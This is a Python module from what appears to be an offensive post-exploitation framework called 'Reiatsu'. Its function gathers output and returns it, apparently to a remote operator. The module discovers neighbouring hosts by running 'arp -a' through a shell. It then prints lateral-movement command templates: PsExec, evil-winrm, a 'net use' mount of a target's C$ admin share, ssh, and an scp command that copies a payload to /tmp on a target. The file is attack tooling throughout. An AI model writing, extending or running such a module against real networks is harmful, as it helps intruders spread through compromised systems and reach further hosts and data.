"""
Reiatsu Lateral Movement Module - Network recon and movement techniques.
"""
import platform
import subprocess
import io
import sys

class Lateral:
    """Tools for network reconnaissance and lateral movement techniques."""
    
    @staticmethod
    def _discover_hosts():
        """Discover hosts using ARP table analysis."""
        output = ""
        try:
            cmd = 'arp -a'
            output += f"[+] Running: '{cmd}'\n"
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, errors='ignore')
            output += result
        except Exception as e:
            output += f"[-] Host discovery failed: {e}\n"
        return output

    @staticmethod
    def run_remote(args):
        """Main entry point for the lateral movement module."""
        old_stdout = sys.stdout
        sys.stdout = captured_output = io.StringIO()
        
        try:
            print(f"[+] Running Lateral Movement recon on {platform.system()}...")
            
            print("\n--- Host Discovery (ARP Table) ---")
            print(Lateral._discover_hosts())
            
            print("\n--- Lateral Movement Examples ---")
            print("[!] Templates require proper tools and credentials.")
            
            if platform.system() == "Windows":
                print("\nWindows:")
                print("  - PsExec: python psexec.py <domain>/<user>@<target> 'whoami'")
                print("  - WinRM: evil-winrm -i <target> -u <user> -p <pass>")
                print("  - SMB: net use \\\\<target>\\C$ /user:<user> <pass>")
            else:
                print("\nLinux:")
                print("  - SSH: ssh <user>@<target> 'id'")
                print("  - SCP: scp payload <user>@<target>:/tmp/")

        except Exception as e:
            print(f"[-] Module execution failed: {e}")
        finally:
            sys.stdout = old_stdout
            
        return captured_output.getvalue()